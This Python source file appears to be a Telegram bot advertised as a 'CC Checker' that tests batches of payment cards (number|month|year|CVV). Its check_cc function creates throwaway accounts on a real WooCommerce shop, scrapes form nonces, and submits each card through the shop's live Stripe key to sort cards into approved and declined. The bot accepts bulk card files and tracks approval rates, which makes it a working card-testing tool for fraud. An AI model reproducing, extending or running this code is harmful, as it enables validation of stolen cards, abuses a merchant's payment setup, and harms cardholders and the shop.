import requests
import asyncio
import json
import random
import re
import os
import aiohttp
from fake_useragent import UserAgent
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import logging
from datetime import datetime

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================================
#  ENVIRONMENT VARIABLES
# ================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set")

ADMIN_IDS = []
admin_ids_str = os.getenv("ADMIN_IDS", "8899843332")
if admin_ids_str:
    ADMIN_IDS = [int(x.strip()) for x in admin_ids_str.split(",") if x.strip()]

# ================================
#  PERSISTENT STORAGE (Railway)
# ================================
DATA_DIR = os.getenv("DATA_DIR", "/app/data")      # Railway volume mount point
if not os.path.exists(DATA_DIR):
    DATA_DIR = "."                                 # fallback to current directory
os.makedirs(DATA_DIR, exist_ok=True)

CHANNELS_FILE = os.path.join(DATA_DIR, "channels.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")

# ================================
#  STATISTICS
# ================================
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0,
    'start_time': datetime.now()
}

# Global variables for processing
processing_cards = []
processing_status = {}
current_message_id = None
current_chat_id = None

# ================ CUSTOM EMOJI MAPPINGS ================
# Text emojis (from provided list)
TEXT_EMOJI_IDS = {
    '✨': '5219899949281453881',
    '🔍': '5222472119295684375',
    '📌': '5222108309795908493',
    '📂': '5219672809936006424',
    '⚡': '5244820603663296299',
    '🛠': '5219943216781995020',
    '📊': '5222400230133081714',
    '📈': '5222148368955877900',
    '📁': '5246794802560774143',
    '🔄': '5220053623211305785',
    '❓': '5220197908342648622',
    '✅': '5222241728659988366',
    '❌': '5260424249914435335',
    '⚠️': '5219901967916084166',
    '🚫': '5217890643321300022',
    '🕐': '5246863809800318186',
    '📝': '5247213725080890199',
    '🔙': '5258023599419171861',
    '⏳': '5220070652756635426',
    '▰': '5246942081284320100',
    '▱': '5220046725493828505',
    '🔘': '5303396278179210513',
    '▪️': '5276489300207217985',
    '◾': '5294524383279198295',
    '◽': '5294096239464295059',
    '🔷': '5364174510708764528',
    '🔶': '5294527084813626369',
    '🔴': '5294017134756636818',
    '🟢': '5332423642850536254',
    '🟡': '5264892613630111886',
    '🟣': '5301096984617166561',
    '⚪': '5301275719681190738',
    '⚫': '5310224206732996002',
    '💠': '5377377257356537351',
    'ℹ️': '5310224206732996002',
    '❕': '5310224206732996002',
    '❗': '5310224206732996002',
    '✔️': '5222241728659988366',
    '✖️': '5260424249914435335',
    '▶️': '5303396278179210513',
    '◀️': '5303396278179210513',
}

# Button emojis (from provided list)
BUTTON_EMOJI_IDS = {
    '📊': '6170163662544707658',
    '📈': '6294142703907116473',
    '📁': '6294106669131503002',
    '🔄': '6176905893616031802',
    '❓': '6091456153462512920',
    '✅': '6176742294016760397',
    '❌': '6293797538860373333',
    '⚠️': '5318938025361679130',
    '🚫': '5316657943188349246',
    '🔍': '5316971840873177080',
    '📝': '6129812419028982717',
    '🔙': '6129705083501293112',
    '🛠': '6129801569941592173',
    '📌': '6129650399977675538',
    '📂': '6129769198773083022',
    '⚡': '6131886699254388574',
    '🔘': '6129572317472233948',
    '◀️': '6129817830687775854',
    '▶️': '6129653943325694007',
    '🟢': '6129488844782836766',
    '🔴': '6129891098534877664',
    '🟡': '6129625171339778354',
    '🟣': '6129782839589214594',
    '⚪': '6129771638314523716',
    '⚫': '6129444065453808638',
    '💠': '6129828611055689014',
}

# ================ HELPER: Replace emojis with custom emoji tags ================
def replace_emojis(text, mapping, parse_mode='HTML'):
    """Replace emojis in text with <emoji id=...> for HTML parse mode."""
    if parse_mode != 'HTML':
        return text
    for emoji, eid in mapping.items():
        text = text.replace(emoji, f'<emoji id="{eid}">')
    return text

def emojify_text(text):
    """Replace text emojis with custom emoji tags."""
    return replace_emojis(text, TEXT_EMOJI_IDS, 'HTML')

def emojify_button(text):
    """Replace button emojis with custom emoji tags."""
    return replace_emojis(text, BUTTON_EMOJI_IDS, 'HTML')

# ================ CHANNEL MANAGEMENT ================
def load_channels():
    try:
        with open(CHANNELS_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_channels(channels):
    with open(CHANNELS_FILE, 'w') as f:
        json.dump(channels, f)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(json.load(f))
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(list(users), f)

def add_user(user_id):
    users = load_users()
    users.add(user_id)
    save_users(users)

async def check_user_joined_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if user has joined all required channels."""
    channels = load_channels()
    if not channels:
        return True, []
    user_id = update.effective_user.id
    not_joined = []
    for channel in channels:
        try:
            # channel can be username (without @) or ID
            chat_id = channel if channel.startswith('-') or channel.isdigit() else f'@{channel}'
            member = await context.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                not_joined.append(channel)
        except Exception as e:
            logger.error(f"Error checking channel {channel}: {e}")
            not_joined.append(channel)  # treat as not joined to be safe
    return len(not_joined) == 0, not_joined

# ================ FORCE JOIN HANDLING ================
async def show_join_page(update: Update, context: ContextTypes.DEFAULT_TYPE, not_joined):
    """Show a page with channel join buttons and a 'Joined' button."""
    keyboard = []
    for channel in not_joined:
        if channel.startswith('-') or channel.isdigit():
            # Private channel – show info button
            keyboard.append([InlineKeyboardButton(
                f"{emojify_button('📌')} Join Private Channel",
                callback_data=f"join_info_{channel}"
            )])
        else:
            url = f"https://t.me/{channel}"
            keyboard.append([InlineKeyboardButton(
                f"{emojify_button('📌')} Join @{channel}",
                url=url
            )])
    keyboard.append([InlineKeyboardButton(
        f"{emojify_button('✅')} I have joined",
        callback_data="check_joined"
    )])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        f"{emojify_text('⚠️')} <b>Please join the following channels first:</b>\n\n"
        "Click the buttons below to join each channel, then press <b>\"I have joined\"</b> to continue.\n\n"
        "If you've already joined, press the button below."
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def check_joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback when user clicks 'I have joined'."""
    query = update.callback_query
    await query.answer()
    joined, not_joined = await check_user_joined_channels(update, context)
    if joined:
        await start(update, context, from_callback=True, query=query)
    else:
        await show_join_page(update, context, not_joined)

# ================ CORE FUNCTIONS ================
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_random_info():
    return {"email": f"user{random.randint(100000, 999999)}@gmail.com"}

async def check_cc(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        
        random_data = await get_random_info()
        email = random_data["email"]
        user = f"user{random.randint(100000, 999999)}"

        s = requests.Session()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers)
        
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
        
        if not nonce:
            return "DECLINED - Failed to get nonce"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image.webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u-0, i',
            'referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers)
        
        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
        
        if not pnonce:
            return "DECLINED - Failed to get payment nonce"

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        if response.status_code != 200:
            return f"DECLINED - Stripe Error: {response.status_code}"

        try:
            payment_id = response.json()['id']
        except:
            return "DECLINED - Failed to get payment ID"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=1, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }

        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return "APPROVED ✅"
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return f"DECLINED ❌ - {error_msg}"
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return "DECLINED ❌ - Nonce failed"
                elif 'error' in response.text.lower():
                    return f"DECLINED ❌ - {response.text}"
                else:
                    return f"UNKNOWN ⚠️ - {response.text}"
        else:
            return f"HTTP Error: {response.status_code}"

    except Exception as e:
        return f"ERROR ⚠️ - {str(e)}"

# ================ BOT COMMANDS ================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE, from_callback=False, query=None):
    """Send a welcome message with inline buttons, after checking force join."""
    # Add user to broadcast list
    add_user(update.effective_user.id)
    
    # Check force join
    joined, not_joined = await check_user_joined_channels(update, context)
    if not joined:
        if from_callback and query:
            await show_join_page(update, context, not_joined)
        else:
            await show_join_page(update, context, not_joined)
        return
    
    # All joined, show main menu
    keyboard = [
        [
            InlineKeyboardButton(f"{emojify_button('📊')} Check CC", callback_data="check_cc"),
            InlineKeyboardButton(f"{emojify_button('📈')} Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton(f"{emojify_button('📁')} Check File", callback_data="check_file"),
            InlineKeyboardButton(f"{emojify_button('🔄')} Reset Stats", callback_data="reset_stats")
        ],
        [
            InlineKeyboardButton(f"{emojify_button('❓')} Help", callback_data="help")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        f"{emojify_text('✨')} <b>Welcome to CC Checker Bot!</b> {emojify_text('✨')}\n\n"
        f"{emojify_text('🔍')} <b>I can help you validate credit cards</b>\n"
        f"{emojify_text('📌')} <b>Send me cards in this format:</b>\n"
        "<code>5121078835045021|12|2041|111</code>\n\n"
        f"{emojify_text('📂')} <b>Or send a .txt file with multiple cards</b>\n"
        f"{emojify_text('⚡')} <b>Use /chk to start checking</b>\n\n"
        f"{emojify_text('🛠')} <b>Choose an option below:</b>"
    )
    
    if from_callback and query:
        await query.edit_message_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start checking process"""
    joined, not_joined = await check_user_joined_channels(update, context)
    if not joined:
        await show_join_page(update, context, not_joined)
        return
    
    keyboard = [
        [
            InlineKeyboardButton(f"{emojify_button('📝')} Enter Cards", callback_data="check_cc"),
            InlineKeyboardButton(f"{emojify_button('📁')} Upload File", callback_data="check_file")
        ],
        [
            InlineKeyboardButton(f"{emojify_button('🔙')} Back", callback_data="back_to_menu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        f"{emojify_text('🔍')} <b>Start CC Checking</b>\n\n"
        "Choose how you want to provide the cards:\n\n"
        f"{emojify_text('📝')} <b>Option 1:</b> Enter cards manually\n"
        f"{emojify_text('📁')} <b>Option 2:</b> Upload a .txt file\n\n"
        "<i>Each card should be in format:</i>\n"
        "<code>5121078835045021|12|2041|111</code>"
    )
    
    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    stats_text = (
        f"{emojify_text('📊')} <b>━━━━━━ STATISTICS ━━━━━━</b> {emojify_text('📊')}\n\n"
        f"{emojify_text('🕐')} <b>Uptime:</b> <code>{hours}h {minutes}m</code>\n"
        f"{emojify_text('📊')} <b>Total Checked:</b> <code>{stats['total']}</code>\n\n"
        f"{emojify_text('✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
        f"{emojify_text('❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
        f"{emojify_text('⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
        f"{emojify_text('🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
        f"{emojify_text('📈')} <b>Success Rate:</b> <code>{stats['approved']/stats['total']*100:.1f}%</code>" if stats['total'] > 0 else f"{emojify_text('📈')} <b>Success Rate:</b> <code>0%</code>"
    )
 
    keyboard = [[InlineKeyboardButton(f"{emojify_button('🔄')} Refresh Stats", callback_data="stats")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def reset_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset statistics"""
    global stats
    stats = {
        'total': 0,
        'approved': 0,
        'declined': 0,
        'unknown': 0,
        'errors': 0,
        'start_time': datetime.now()
    }
    
    await update.callback_query.edit_message_text(
        f"{emojify_text('🔄')} <b>Statistics have been reset!</b> {emojify_text('✅')}\n\n"
        "All counters are now at 0.",
        parse_mode='HTML'
    )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    help_text = (
        f"{emojify_text('❓')} <b>━━━━━━ HELP ━━━━━━</b> {emojify_text('❓')}\n\n"
        f"{emojify_text('🤖')} <b>Bot Commands:</b>\n"
        "• /start - Welcome message\n"
        "• /chk - Start checking CCs\n"
        "• /stats - Show statistics\n"
        "• /reset - Reset statistics\n\n"
        f"{emojify_text('📝')} <b>CC Format:</b>\n"
        "<code>5121078835045021|12|2041|111</code>\n"
        "<i>(card|month|year|cvv)</i>\n\n"
        f"{emojify_text('📂')} <b>File Support:</b>\n"
        "Send a .txt file with cards\n"
        "One card per line\n\n"
        f"{emojify_text('⚡')} <b>Tips:</b>\n"
        "• Use inline buttons for quick actions\n"
        "• Check stats to track your progress\n"
        "• Send /cancel to stop any operation"
    )
    
    keyboard = [[InlineKeyboardButton(f"{emojify_button('🔙')} Back to Menu", callback_data="back_to_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            help_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            help_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to main menu"""
    query = update.callback_query
    await query.answer()
    joined, not_joined = await check_user_joined_channels(update, context)
    if not joined:
        await show_join_page(update, context, not_joined)
        return
    
    keyboard = [
        [
            InlineKeyboardButton(f"{emojify_button('📊')} Check CC", callback_data="check_cc"),
            InlineKeyboardButton(f"{emojify_button('📈')} Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton(f"{emojify_button('📁')} Check File", callback_data="check_file"),
            InlineKeyboardButton(f"{emojify_button('🔄')} Reset Stats", callback_data="reset_stats")
        ],
        [
            InlineKeyboardButton(f"{emojify_button('❓')} Help", callback_data="help")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        f"{emojify_text('✨')} <b>Welcome to CC Checker Bot!</b> {emojify_text('✨')}\n\n"
        f"{emojify_text('🔍')} <b>I can help you validate credit cards</b>\n"
        f"{emojify_text('📌')} <b>Send me cards in this format:</b>\n"
        "<code>5121078835045021|12|2041|111</code>\n\n"
        f"{emojify_text('📂')} <b>Or send a .txt file with multiple cards</b>\n"
        f"{emojify_text('⚡')} <b>Use /chk to start checking</b>\n\n"
        f"{emojify_text('🛠')} <b>Choose an option below:</b>"
    )
    
    await query.edit_message_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

# ================ BUTTON HANDLER ================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "check_cc":
        joined, not_joined = await check_user_joined_channels(update, context)
        if not joined:
            await show_join_page(update, context, not_joined)
            return
        
        await query.edit_message_text(
            f"{emojify_text('📝')} <b>Please send me the CC details</b>\n\n"
            "Format: <code>5121078835045021|12|2041|111</code>\n"
            "You can send multiple cards, one per line.\n\n"
            "<i>Send /cancel to stop</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_cc'] = True
        
    elif query.data == "check_file":
        joined, not_joined = await check_user_joined_channels(update, context)
        if not joined:
            await show_join_page(update, context, not_joined)
            return
        
        await query.edit_message_text(
            f"{emojify_text('📂')} <b>Please send me a .txt file</b>\n"
            "The file should contain one card per line.\n\n"
            "Format: <code>5121078835045021|12|2041|111</code>\n\n"
            "<i>Send /cancel to stop</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_file'] = True
        
    elif query.data == "stats":
        await show_stats(update, context)
        
    elif query.data == "reset_stats":
        await reset_stats(update, context)
        
    elif query.data == "help":
        await show_help(update, context)
    
    elif query.data == "back_to_menu":
        await back_to_menu(update, context)
    
    elif query.data == "check_joined":
        await check_joined_callback(update, context)
    
    elif query.data.startswith("join_info_"):
        channel = query.data.split("_", 2)[2]
        await query.edit_message_text(
            f"{emojify_text('ℹ️')} <b>Private channel</b>\n\n"
            f"Channel ID: <code>{channel}</code>\n\n"
            "Please join this channel manually (you might need an invite link).\n"
            "After joining, press the <b>\"I have joined\"</b> button.",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{emojify_button('🔙')} Back", callback_data="check_joined")]
            ])
        )

# ================ MESSAGE HANDLER ================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages and files"""
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    if update.message.text and update.message.text.lower() == '/cancel':
        context.user_data.clear()
        await update.message.reply_text(
            f"{emojify_text('❌')} <b>Operation cancelled!</b>\n"
            "Use /start to begin again.",
            parse_mode='HTML'
        )
        return
    
    if context.user_data.get('waiting_for_cc'):
        text = update.message.text.strip()
        lines = text.split('\n')
        valid_cards = []
        for line in lines:
            if line.strip():
                if '|' in line and len(line.split('|')) == 4:
                    valid_cards.append(line.strip())
                else:
                    await update.message.reply_text(
                        f"{emojify_text('❌')} <b>Invalid format:</b> <code>{line}</code>\n"
                        f"Please use: <code>5121078835045021|12|2041|111</code>",
                        parse_mode='HTML'
                    )
                    return
        if valid_cards:
            context.user_data['waiting_for_cc'] = False
            await process_cards(update, context, valid_cards)
        else:
            await update.message.reply_text(
                f"{emojify_text('❌')} <b>No valid cards found!</b>\n"
                "Please send cards in the correct format.",
                parse_mode='HTML'
            )
        return
    
    if context.user_data.get('waiting_for_file'):
        if update.message.document:
            file = await update.message.document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            lines = text.split('\n')
            valid_cards = []
            for line in lines:
                if line.strip():
                    if '|' in line and len(line.split('|')) == 4:
                        valid_cards.append(line.strip())
            if valid_cards:
                context.user_data['waiting_for_file'] = False
                await process_cards(update, context, valid_cards)
            else:
                await update.message.reply_text(
                    f"{emojify_text('❌')} <b>No valid cards found in file!</b>\n"
                    "Each line should be in format: <code>5121078835045021|12|2041|111</code>",
                    parse_mode='HTML'
                )
        else:
            await update.message.reply_text(
                f"{emojify_text('❌')} <b>Please send a text file!</b>\n"
                "Use /cancel to stop.",
                parse_mode='HTML'
            )
        return
    
    if update.message.text and update.message.text.startswith('/chk'):
        await start_check(update, context)
        return
    
    if update.message.text and not update.message.text.startswith('/'):
        await update.message.reply_text(
            f"{emojify_text('❓')} <b>Unknown command or format</b>\n\n"
            "Use /start to see available options\n"
            "Or send cards in format:\n"
            "<code>5121078835045021|12|2041|111</code>",
            parse_mode='HTML'
        )

# ================ PROCESS CARDS ================
async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    processing_cards = cards
    processing_status = {}
    current_chat_id = update.effective_chat.id
    
    progress_text = (
        f"{emojify_text('🔄')} <b>Processing Cards</b>\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n\n"
        f"{emojify_text('📊')} <b>Total:</b> <code>{len(cards)}</code>\n"
        f"{emojify_text('✅')} <b>Approved:</b> <code>0</code>\n"
        f"{emojify_text('❌')} <b>Declined:</b> <code>0</code>\n"
        f"{emojify_text('⚠️')} <b>Unknown:</b> <code>0</code>\n"
        f"{emojify_text('🚫')} <b>Errors:</b> <code>0</code>\n\n"
        f"{emojify_text('⏳')} <b>Processing...</b>"
    )
    
    msg = await update.message.reply_text(progress_text, parse_mode='HTML')
    current_message_id = msg.message_id
    
    async with aiohttp.ClientSession() as session:
        for i, card in enumerate(cards, 1):
            result = await check_cc(card, session)
            processing_status[card] = result
            
            stats['total'] += 1
            if 'APPROVED' in result:
                stats['approved'] += 1
            elif 'DECLINED' in result:
                stats['declined'] += 1
            elif 'ERROR' in result or 'HTTP' in result:
                stats['errors'] += 1
            else:
                stats['unknown'] += 1
            
            progress = int((i / len(cards)) * 10)
            bar = "▰" * progress + "▱" * (10 - progress)
            percentage = int((i / len(cards)) * 100)
            
            progress_text = (
                f"{emojify_text('🔄')} <b>Processing Cards</b>\n\n"
                f"{bar} {percentage}%\n\n"
                f"{emojify_text('📊')} <b>Total:</b> <code>{len(cards)}</code>\n"
                f"{emojify_text('✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
                f"{emojify_text('❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
                f"{emojify_text('⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
                f"{emojify_text('🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
                f"{emojify_text('⏳')} <b>Processing...</b> <code>{i}/{len(cards)}</code>"
            )
            
            try:
                await context.bot.edit_message_text(
                    progress_text,
                    chat_id=current_chat_id,
                    message_id=current_message_id,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error updating progress: {e}")
            
            await asyncio.sleep(0.1)
    
    await show_results(update, context)

async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    approved = []
    declined = []
    unknown = []
    errors = []
    
    for card, result in processing_status.items():
        if 'APPROVED' in result:
            approved.append((card, result))
        elif 'DECLINED' in result:
            declined.append((card, result))
        elif 'ERROR' in result or 'HTTP' in result:
            errors.append((card, result))
        else:
            unknown.append((card, result))
    
